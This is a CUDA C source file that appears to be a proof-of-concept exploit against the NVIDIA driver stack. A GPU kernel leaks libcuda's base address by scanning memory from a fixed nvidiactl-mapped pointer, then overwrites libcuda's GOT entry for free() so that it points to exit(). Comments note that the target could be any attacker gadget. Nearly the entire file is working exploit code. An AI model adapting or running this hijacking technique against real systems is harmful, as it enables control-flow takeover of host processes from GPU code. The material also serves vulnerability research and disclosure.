#include <cuda_runtime.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

__global__ void kernel()
{
    return;
}

__global__ void attack_kernel(size_t *p)
{
    size_t i = 0;
    char *scanner = (char *)p;
    int counter = 0;

    // Leak the base address of libcuda

    size_t *libcuda_base = NULL;
    while(1) {
        if (*(scanner - i) != 'l') {
            i++;
            continue;
        }
        if (*(scanner - i + 1) != 'i' ||
            *(scanner - i + 2) != 'b' ||
            *(scanner - i + 3) != 'c' ||
            *(scanner - i + 4) != 'u' ||
            *(scanner - i + 5) != 'd' ||
            *(scanner - i + 6) != 'a') {
                i++;
                continue;
        }
        if(counter == 0) {
            counter++;
            i++;
            continue;
        }
        
        libcuda_base = (size_t *)(scanner - i);
        libcuda_base = libcuda_base + 19;
        libcuda_base = (size_t *)*libcuda_base;
        printf("base address: %p\n", (void*)*libcuda_base);
        
        break;
    }

    // Overwrite libcuda's GOT (free) entry (offset: 0x436c100)
    // to attacker_gadget, in this case, for showcase, we choose
	// exit() function.

    size_t *free_got_entry = (size_t *)(*libcuda_base + 0x436c100);
    size_t *exit_got_entry = (size_t *)(*libcuda_base + 0x436c5d0);
    
    *free_got_entry = (size_t)*exit_got_entry;

    printf("Overwritten free GOT entry: %p\n", (void*)*free_got_entry);

}


int main()
{
    kernel<<<1, 1>>>();
    cudaDeviceSynchronize();

    // Pass the pointer of fixed address in nvidiactl 
    // nvidiactl base: 0x200400000 
    // offset: 0x7ce8
    unsigned char **pp = (unsigned char **) (0x200400000ULL + 0x7ce8);
    size_t *p   = (size_t*)*pp;
    attack_kernel<<<1, 1>>>(p);
    
    // Wait for the kernel to finish
    cudaDeviceSynchronize();

    // This code never executes, because the free GOT entry has been overwritten
    // and the next free call will trigger the exit function instead, before
    // the printf below can be executed.

    printf("Successfully finished kernel execution.\n");
    return 0;
}
